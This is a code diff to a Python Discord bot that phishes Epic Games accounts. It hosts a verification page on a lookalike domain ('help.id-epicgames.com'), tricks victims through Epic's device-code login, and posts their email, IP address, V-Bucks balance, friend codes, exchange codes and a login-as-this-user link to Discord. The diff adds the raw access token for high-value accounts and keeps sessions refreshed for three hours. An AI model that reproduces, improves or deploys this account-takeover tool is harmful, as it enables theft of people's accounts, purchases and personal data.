@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Discord Bot for Epic Games Authentication with robust ngrok handling, 3-hour token refresh,
-V-Bucks checking, and high-value account alerts.
-- Last Updated: 2025-11-20 08:30:00
+Discord Bot for Epic Games Authentication with integrated V-Bucks checking and 
+Access Token display for high-value accounts.
+- Last Updated: 2025-11-20 08:45:00
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -39,9 +39,7 @@ if DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
 
 # --- Ngrok Configuration ---
 NGROK_AUTHTOKEN = os.getenv("NGROK_AUTHTOKEN")
-# IMPORTANT: Using a custom domain requires a paid ngrok plan.
-# The script will FALL BACK to a free URL if this fails.
-NGROK_DOMAIN = "help.id-epicgames.com"
+NGROK_DOMAIN = "help.id-epicgames.com" # Will fall back to a free URL if this fails
 
 # --- Epic Games & Timings ---
 EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
@@ -49,9 +47,8 @@ REFRESH_INTERVAL = 180  # 3 minutes
 SESSION_DURATION = 10800 # 3 hours
 VBUCKS_THRESHOLD = 5000
 
-# --- Channel Names ---
+# --- Channel Name ---
 MAIN_CHANNEL_NAME = "epic-auth-system"
-HIGH_VALUE_CHANNEL_NAME = "high-value-accounts"
 
 # --- Logging ---
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -60,7 +57,7 @@ logger = logging.getLogger("epic_auth_bot")
 # --- Globals ---
 intents = discord.Intents.default()
 intents.guilds = True
-intents.message_content = True # Enabling Message Content Intent
+intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 ngrok_ready = threading.Event()
@@ -70,12 +67,10 @@ active_sessions = {}
 session_lock = threading.Lock()
 
 # ==============================================================================
-# --- NGROK AND WEB SERVER ---
+# --- NGROK AND WEB SERVER (No changes from v2) ---
 # ==============================================================================
-
 def run_setup():
     """Ensures ngrok is installed and configured."""
-    # (Setup code remains the same as previous version)
     print("--- Starting initial setup ---")
     ngrok_path = os.path.join(os.getcwd(), "ngrok")
     if not os.path.exists(ngrok_path):
@@ -116,7 +111,6 @@ def run_setup():
 
 
 class RequestHandler(http.server.SimpleHTTPRequestHandler):
-    # (RequestHandler code remains the same as previous version)
     def do_GET(self):
         if self.path == '/verify':
             client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
@@ -151,11 +145,9 @@ def run_web_server(port):
         httpd.serve_forever()
 
 def setup_ngrok_tunnel(port):
-    """Starts an ngrok tunnel, attempting custom domain and falling back to a free one."""
     global verification_link
     ngrok_executable = os.path.join(os.getcwd(), "ngrok")
     
-    # Try to start with custom domain first (requires paid plan)
     if NGROK_AUTHTOKEN and NGROK_DOMAIN:
         logger.info(f"🌐 Attempting to start ngrok tunnel with custom domain: {NGROK_DOMAIN}...")
         command = [ngrok_executable, 'http', str(port), f'--domain={NGROK_DOMAIN}']
@@ -165,21 +157,19 @@ def setup_ngrok_tunnel(port):
         command = [ngrok_executable, 'http', str(port)]
         subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    # Poll ngrok API to get the public URL
     public_url = None
-    for i in range(8): # Poll for up to 20 seconds
+    for i in range(8):
         time.sleep(2.5)
         try:
             with requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2) as r:
                 r.raise_for_status()
                 tunnels = r.json().get('tunnels', [])
                 if tunnels:
-                    # Prefer the custom domain if it's active
                     custom_tunnel = next((t for t in tunnels if NGROK_DOMAIN in t.get('public_url', '')), None)
                     if custom_tunnel:
                         public_url = custom_tunnel['public_url']
                         logger.info(f"✅ Successfully using custom domain: {public_url}")
-                    else: # Fallback to the first available HTTPS tunnel
+                    else:
                         public_url = tunnels[0]['public_url']
                         logger.warning(f"⚠️  Custom domain failed. Falling back to free URL: {public_url}")
                     break
@@ -194,91 +184,56 @@ def setup_ngrok_tunnel(port):
     else:
         logger.critical("❌ Ngrok failed to start or create a tunnel after 20 seconds.")
         sys.exit(1)
-
-
 # ==============================================================================
-# --- EPIC GAMES API & DISCORD LOGIC (remains the same) ---
+# --- EPIC GAMES API & DISCORD LOGIC ---
 # ==============================================================================
+
 async def create_epic_auth_session():
-    """Creates a new device authorization session with Epic Games."""
-    headers = {
-        "Authorization": f"basic {EPIC_TOKEN}",
-        "Content-Type": "application/x-www-form-urlencoded"
-    }
+    headers = {"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
     async with aiohttp.ClientSession() as sess:
-        # Get client credentials token
         async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data={"grant_type": "client_credentials"}) as r:
             r.raise_for_status()
             token_data = await r.json()
-        
-        # Get device authorization details
-        auth_headers = {
-            "Authorization": f"bearer {token_data['access_token']}",
-            "Content-Type": "application/x-www-form-urlencoded"
-        }
+        auth_headers = {"Authorization": f"bearer {token_data['access_token']}", "Content-Type": "application/x-www-form-urlencoded"}
         async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers=auth_headers) as r:
             r.raise_for_status()
             dev_auth = await r.json()
-            
-    return {
-        'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}",
-        'device_code': dev_auth['device_code'],
-        'interval': dev_auth.get('interval', 5),
-        'expires_in': dev_auth.get('expires_in', 600)
-    }
+    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}
 
 async def get_exchange_code(access_token):
-    """Uses an access_token to get a new exchange code."""
     try:
         async with aiohttp.ClientSession() as sess:
             headers = {"Authorization": f"bearer {access_token}"}
             async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers=headers) as r:
-                if r.status == 200:
-                    return (await r.json())['code']
-                else:
-                    logger.warning(f"Failed to get exchange code, status {r.status}: {await r.text()}")
-                    return None
-    except Exception as e:
-        logger.error(f"❌ Exception while getting exchange code: {e}")
-        return None
+                return (await r.json())['code'] if r.status == 200 else None
+    except Exception: return None
 
 async def get_stw_codes(access_token, account_id):
-    """Fetches Save The World friend codes."""
     logger.info(f"[{account_id[:8]}] Fetching STW friend codes...")
-    platforms = ['epic', 'xbox']
     all_codes = []
     headers = {"Authorization": f"Bearer {access_token}"}
-    
     async with aiohttp.ClientSession() as sess:
-        for platform in platforms:
+        for platform in ['epic', 'xbox']:
             url = f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/friendcodes/{account_id}/{platform}"
             try:
                 async with sess.get(url, headers=headers) as r:
                     if r.status == 200 and (codes := await r.json()):
-                        logger.info(f"[{account_id[:8]}] Found {len(codes)} code(s) for {platform.upper()}")
-                        all_codes.extend([f"{platform.upper()}: `{code['codeId']}`" for code in codes])
-            except Exception as e:
-                logger.error(f"[{account_id[:8]}] Exception fetching STW codes for {platform.upper()}: {e}")
+                        all_codes.extend([f"{platform.upper()}: `{c['codeId']}`" for c in codes])
+            except Exception: continue
     return all_codes
 
 async def get_vbucks_balance(access_token, account_id):
-    """Fetches the V-Bucks balance for a given account."""
     headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
     url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core"
-    
     try:
         async with aiohttp.ClientSession() as sess:
             async with sess.post(url, headers=headers, json={}) as r:
                 if r.status == 200:
-                    profile_data = await r.json()
-                    for item in profile_data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {}).values():
+                    data = await r.json()
+                    for item in data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {}).values():
                         if 'Currency:Mtx' in item.get('templateId', ''):
-                            vbucks = item.get('quantity', 0)
-                            logger.info(f"[{account_id[:8]}] Found V-Bucks balance: {vbucks}")
-                            return vbucks
-    except Exception as e:
-        logger.error(f"[{account_id[:8]}] Error fetching V-Bucks: {e}")
-        return 0
+                            return item.get('quantity', 0)
+    except Exception: return 0
     return 0
 
 async def get_or_create_channel(guild, channel_name):
@@ -294,161 +249,98 @@ async def get_or_create_channel(guild, channel_name):
 
 @bot.event
 async def on_guild_join(guild):
-    """Handle the bot joining a new server."""
     logger.info(f"Joined new guild: {guild.name} (ID: {guild.id})")
     await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
-    await get_or_create_channel(guild, HIGH_VALUE_CHANNEL_NAME)
 
 @bot.event
 async def on_ready():
-    """Called when the bot is ready and connected to Discord."""
-    print(f'Logged in as {bot.user.name}')
-    print("=" * 60)
-    
-    # Ensure channels exist in all guilds and send startup message
-    for guild in bot.guilds:
-        main_channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
-        await get_or_create_channel(guild, HIGH_VALUE_CHANNEL_NAME)
-        
-        if main_channel and verification_link and not bot.is_closed():
-            embed = discord.Embed(
-                title="🚀 Epic Auth System Online",
-                description=f"System is ready for verifications.\n\n🔗 **Verification Link:**\n`{verification_link}`",
-                color=discord.Color.blue()
-            )
-            try:
-                await main_channel.send(embed=embed)
-            except discord.Forbidden:
-                logger.error(f"Could not send startup message to {guild.name}. Missing permissions.")
-    
-    print(f"✅ Bot is ready and channels are configured in {len(bot.guilds)} guild(s).")
-    print("=" * 60)
-
-
-async def send_login_success_embed(session_id, account_info, exchange_code, user_ip, stw_codes, vbucks):
-    """Sends and stores the initial login success message."""
-    display_name = account_info.get('displayName', 'N/A')
-    account_id = account_info.get('id', 'N/A')
-    
-    embed = build_user_embed(
-        session_id, account_info, exchange_code, user_ip, 
-        stw_codes, vbucks, 0, is_initial=True
-    )
-    
+    print(f'Logged in as {bot.user.name}\n' + "=" * 60)
     for guild in bot.guilds:
         channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
-        if channel:
-            message = await channel.send(embed=embed)
-            with session_lock:
-                if session_id in active_sessions:
-                    active_sessions[session_id]['message_ids'][guild.id] = message.id
+        if channel and verification_link and not bot.is_closed():
+            embed = discord.Embed(title="🚀 Epic Auth System Online", description=f"System is ready for verifications.\n\n🔗 **Verification Link:**\n`{verification_link}`", color=discord.Color.blue())
+            try:
+                await channel.send(embed=embed)
+            except discord.Forbidden:
+                logger.error(f"Could not send startup message to {guild.name}.")
+    print(f"✅ Bot is ready and channels are configured in {len(bot.guilds)} guild(s).\n" + "=" * 60)
 
-async def update_login_message(session_id, account_info, exchange_code, user_ip, stw_codes, vbucks, refresh_count):
-    """Edits the existing login message with refreshed data."""
-    embed = build_user_embed(
-        session_id, account_info, exchange_code, user_ip,
-        stw_codes, vbucks, refresh_count, is_initial=False
-    )
-
-    with session_lock:
-        session = active_sessions.get(session_id)
-        if not session: return
-        message_ids = session['message_ids']
-
-    for guild_id, message_id in message_ids.items():
-        guild = bot.get_guild(guild_id)
-        if guild:
-            channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
-            if channel:
-                try:
-                    message = await channel.fetch_message(message_id)
-                    await message.edit(embed=embed)
-                except discord.NotFound:
-                    logger.warning(f"Message {message_id} not found in guild {guild.name}. It may have been deleted.")
-                    # Re-send if deleted
-                    new_message = await channel.send(embed=embed)
-                    with session_lock:
-                         if session_id in active_sessions:
-                            active_sessions[session_id]['message_ids'][guild.id] = new_message.id
-                except discord.Forbidden:
-                    logger.error(f"Missing permissions to edit message in {guild.name}.")
-
-
-def build_user_embed(session_id, account_info, exchange_code, user_ip, stw_codes, vbucks, refresh_count, is_initial):
-    """Helper function to build the consistent embed for users."""
-    display_name = account_info.get('displayName', 'N/A')
-    email = account_info.get('email', 'N/A')
-    account_id = account_info.get('id', 'N/A')
+def build_user_embed(session, exchange_code, is_initial):
+    """Helper function to build the consistent user information embed."""
+    account_info = session['account_info']
+    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
     login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
-    
+
     title = "✅ User Logged In Successfully" if is_initial else "🔄 User Session Refreshed"
     description = f"**{display_name}** has completed verification." if is_initial else f"Session for **{display_name}** has been updated."
-    
     embed = discord.Embed(title=title, description=description, color=discord.Color.green())
-    
+
     embed.add_field(name="Display Name", value=display_name, inline=True)
     embed.add_field(name="Email", value=email, inline=True)
-    embed.add_field(name="V-Bucks", value=f"**{vbucks}** 💸" if vbucks > 0 else "Not found", inline=True)
+    embed.add_field(name="V-Bucks", value=f"**{session['vbucks']}** 💸" if session['vbucks'] > 0 else "0", inline=True)
     embed.add_field(name="Account ID", value=f"`{account_id}`", inline=False)
-    embed.add_field(name="IP Address", value=f"`{user_ip}`", inline=False)
+    embed.add_field(name="IP Address", value=f"`{session['user_ip']}`", inline=False)
     
-    if stw_codes:
-        embed.add_field(name="🔑 Save The World Codes", value="\n".join(stw_codes), inline=False)
+    if session['stw_codes']:
+        embed.add_field(name="🔑 Save The World Codes", value="\n".join(session['stw_codes']), inline=False)
+
+    # Add the Epic Auth (Access) Token only if V-Bucks are over the threshold
+    if session['vbucks'] > VBUCKS_THRESHOLD:
+        embed.add_field(name="💎 Epic Auth Token (High Value)", value=f"```{session['access_token']}```", inline=False)
+        embed.colour = discord.Color.gold() # Change embed color for high value accounts
 
     embed.add_field(name="🔗 Direct Login Link", value=f"**[Click to login as this user]({login_link})**", inline=False)
     embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
 
-    session_expiry = datetime.utcnow() + timedelta(seconds=SESSION_DURATION - (time.time() - active_sessions[session_id]['created_at']))
-    embed.set_footer(text=f"Session ID: {session_id} | Refresh #{refresh_count} | Expires: {session_expiry.strftime('%H:%M:%S UTC')}")
+    expires_at = datetime.fromtimestamp(session['expires_at'])
+    embed.set_footer(text=f"Session ID: {session['session_id']} | Refresh #{session['refresh_count']} | Expires: {expires_at.strftime('%H:%M:%S UTC')}")
     embed.timestamp = datetime.utcnow()
     
     return embed
 
+async def send_or_update_embed(session_id, exchange_code, is_initial=False):
+    """Sends the initial embed or edits an existing one."""
+    with session_lock:
+        session = active_sessions.get(session_id)
+        if not session: return
 
-async def manage_high_value_account(account_info, vbucks, access_token):
-    """Manages the process for a high-value account."""
-    account_id = account_info.get('id', 'N/A')
-    display_name = account_info.get('displayName', 'N/A')
-    logger.info(f"[{account_id[:8]}] High-value account detected: {display_name} with {vbucks} V-Bucks.")
+    embed = build_user_embed(session, exchange_code, is_initial)
 
-    # Create a persistent authorization session
-    auth_session = await create_epic_auth_session()
-    
-    embed = discord.Embed(
-        title="🚨 High-Value Account Detected!",
-        description=f"**{display_name}** has more than {VBUCKS_THRESHOLD} V-Bucks.",
-        color=discord.Color.gold()
-    )
-    embed.add_field(name="Display Name", value=display_name, inline=True)
-    embed.add_field(name="V-Bucks Balance", value=f"**{vbucks}** 💸", inline=True)
-    embed.add_field(name="Account ID", value=f"`{account_id}`", inline=False)
-    embed.add_field(name="🔴 Persistent Login Link", value=f"[Activate Login]({auth_session['activation_url']})", inline=False)
-    embed.set_footer(text=f"This is a persistent authorization link. It will stay active.")
-    embed.timestamp = datetime.utcnow()
-    
-    message_references = {}
     for guild in bot.guilds:
-        channel = await get_or_create_channel(guild, HIGH_VALUE_CHANNEL_NAME)
-        if channel:
-            message = await channel.send(embed=embed)
-            message_references[guild.id] = message.id
+        channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
+        if not channel: continue
 
-    logger.info(f"[{account_id[:8]}] Posted high-value alert to {len(message_references)} guild(s).")
+        if is_initial:
+            message = await channel.send(embed=embed)
+            with session_lock:
+                if session_id in active_sessions:
+                    active_sessions[session_id]['message_ids'][guild.id] = message.id
+        else:
+            message_id = session['message_ids'].get(guild.id)
+            if not message_id: continue
+            try:
+                message = await channel.fetch_message(message_id)
+                await message.edit(embed=embed)
+            except (discord.NotFound, discord.Forbidden):
+                logger.warning(f"Failed to edit message {message_id} in {guild.name}. Re-sending.")
+                new_message = await channel.send(embed=embed)
+                with session_lock:
+                    if session_id in active_sessions:
+                        active_sessions[session_id]['message_ids'][guild.id] = new_message.id
+
+# ==============================================================================
+# --- CORE AUTHENTICATION & REFRESH LOGIC ---
+# ==============================================================================
 
 def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip):
-    """Synchronous wrapper to run the async monitoring task."""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    try:
-        loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip))
-    finally:
-        loop.close()
+    try: loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip))
+    finally: loop.close()
 
 async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
     """Monitors the Epic Games device authentication flow for completion."""
-    device_id = device_code[:8]
-    logger.info(f"[{device_id}] 👁️  Monitoring Epic auth...")
-    
+    logger.info(f"[{device_code[:8]}] 👁️  Monitoring Epic auth...")
     async with aiohttp.ClientSession() as sess:
         deadline = time.time() + expires_in
         while time.time() < deadline:
@@ -461,122 +353,88 @@ async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
                 
                 token_resp = await r.json()
                 if "access_token" in token_resp:
-                    logger.info(f"[{device_id}] ✅ USER LOGGED IN!")
-                    access_token = token_resp['access_token']
-                    account_id = token_resp['account_id']
+                    access_token, account_id = token_resp['access_token'], token_resp['account_id']
+                    logger.info(f"[{account_id[:8]}] ✅ USER LOGGED IN!")
                     
-                    # Fetch account details
                     auth_headers = {"Authorization": f"bearer {access_token}"}
                     async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}", headers=auth_headers) as r3:
                         account_info = await r3.json()
                     
-                    # Get initial exchange code
                     exchange_code = await get_exchange_code(access_token)
-                    if not exchange_code:
-                        logger.error(f"[{account_id[:8]}] Failed to get initial exchange code. Aborting session.")
-                        return
+                    if not exchange_code: return
 
-                    # Fetch STW codes and V-Bucks
+                    # ALWAYS fetch STW codes and V-Bucks
                     stw_codes = await get_stw_codes(access_token, account_id)
-                    vbucks = 0
-                    if not stw_codes:
-                        vbucks = await get_vbucks_balance(access_token, account_id)
+                    vbucks = await get_vbucks_balance(access_token, account_id)
 
                     session_id = str(uuid.uuid4())[:8]
                     with session_lock:
                         active_sessions[session_id] = {
+                            'session_id': session_id,
                             'access_token': access_token,
                             'account_info': account_info,
                             'user_ip': user_ip,
-                            'created_at': time.time(),
                             'expires_at': time.time() + SESSION_DURATION,
                             'stw_codes': stw_codes,
                             'vbucks': vbucks,
-                            'message_ids': {}, # {guild_id: message_id}
+                            'message_ids': {},
                             'refresh_count': 0
                         }
                     
                     # Schedule tasks in the main bot event loop
-                    asyncio.run_coroutine_threadsafe(send_login_success_embed(session_id, account_info, exchange_code, user_ip, stw_codes, vbucks), bot.loop)
+                    asyncio.run_coroutine_threadsafe(send_or_update_embed(session_id, exchange_code, is_initial=True), bot.loop)
                     asyncio.run_coroutine_threadsafe(auto_refresh_session(session_id), bot.loop)
-                    
-                    if vbucks > VBUCKS_THRESHOLD:
-                         asyncio.run_coroutine_threadsafe(manage_high_value_account(account_info, vbucks, access_token), bot.loop)
-
                     return
 
 async def auto_refresh_session(session_id):
-    """Refreshes the exchange code for the session's lifetime and updates the Discord message."""
-    try:
+    """Refreshes the exchange code and updates the Discord message."""
+    with session_lock:
+        session = active_sessions.get(session_id)
+        if not session: return
+        display_name = session['account_info'].get('displayName', 'Unknown')
+        
+    logger.info(f"[{session_id}] 🔄 Auto-refresh task STARTED for {display_name}.")
+    while time.time() < session['expires_at']:
+        await asyncio.sleep(REFRESH_INTERVAL)
+        
         with session_lock:
             session = active_sessions.get(session_id)
-            if not session: return
-            display_name = session['account_info'].get('displayName', 'Unknown')
-            session_expiry_time = session['expires_at']
-
-        logger.info(f"[{session_id}] 🔄 Auto-refresh task STARTED for {display_name}. Will run for approx. 3 hours.")
-
-        while time.time() < session_expiry_time:
-            await asyncio.sleep(REFRESH_INTERVAL)
-            
+            if not session: break
+        
+        new_exchange_code = await get_exchange_code(session['access_token'])
+        if new_exchange_code:
             with session_lock:
-                session = active_sessions.get(session_id)
-                if not session:
-                    logger.info(f"[{session_id}] ⏹️ Session removed; stopping auto-refresh for {display_name}.")
-                    break
-                current_access_token = session['access_token']
+                if session_id in active_sessions:
+                    active_sessions[session_id]['refresh_count'] += 1
+            
+            logger.info(f"[{session_id}] ✅ Session REFRESHED for {display_name} (Refresh #{session['refresh_count']})")
+            await send_or_update_embed(session_id, new_exchange_code)
+        else:
+            logger.warning(f"[{session_id}] Session refresh failed for {display_name}. Retrying.")
 
-            new_exchange_code = await get_exchange_code(current_access_token)
-
-            if new_exchange_code:
-                with session_lock:
-                    session = active_sessions.get(session_id)
-                    if not session: break
-                    session['refresh_count'] += 1
-                    refresh_count = session['refresh_count']
-                
-                logger.info(f"[{session_id}] ✅ Exchange code REFRESHED for {display_name} (Refresh #{refresh_count})")
-                await update_login_message(
-                    session_id, session['account_info'], new_exchange_code, session['user_ip'],
-                    session['stw_codes'], session['vbucks'], refresh_count
-                )
-            else:
-                logger.warning(f"[{session_id}] Exchange code refresh failed for {display_name}. Will retry.")
-
-    except asyncio.CancelledError:
-        logger.info(f"[{session_id}] ⏹️ Auto-refresh task was cancelled for {display_name}")
-    finally:
-        with session_lock:
-            session_info = active_sessions.pop(session_id, None)
-            display_name = session_info['account_info'].get('displayName', 'Unknown') if session_info else 'Unknown'
-        logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}.")
+    with session_lock: active_sessions.pop(session_id, None)
+    logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}.")
 
 # ==============================================================================
 # --- APPLICATION STARTUP ---
 # ==============================================================================
 
 def main():
-    """Main function to orchestrate startup."""
     run_setup()
-
-    # Start the web server and ngrok in separate threads
     threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
     threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
 
     logger.info("Waiting for ngrok to initialize...")
     if not ngrok_ready.wait(timeout=25):
-        logger.critical("❌ Timed out waiting for ngrok. Please check your network and ngrok status.")
+        logger.critical("❌ Timed out waiting for ngrok. Exiting.")
         sys.exit(1)
     
-    # Start the bot
     if DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
         logger.critical("FATAL: DISCORD_BOT_TOKEN is not set.")
         return
         
     try:
         bot.run(DISCORD_BOT_TOKEN)
-    except discord.LoginFailure:
-        logger.critical("FATAL: Failed to log in. Please check your DISCORD_BOT_TOKEN.")
     except Exception as e:
         logger.critical(f"FATAL: An error occurred while running the bot: {e}")
 
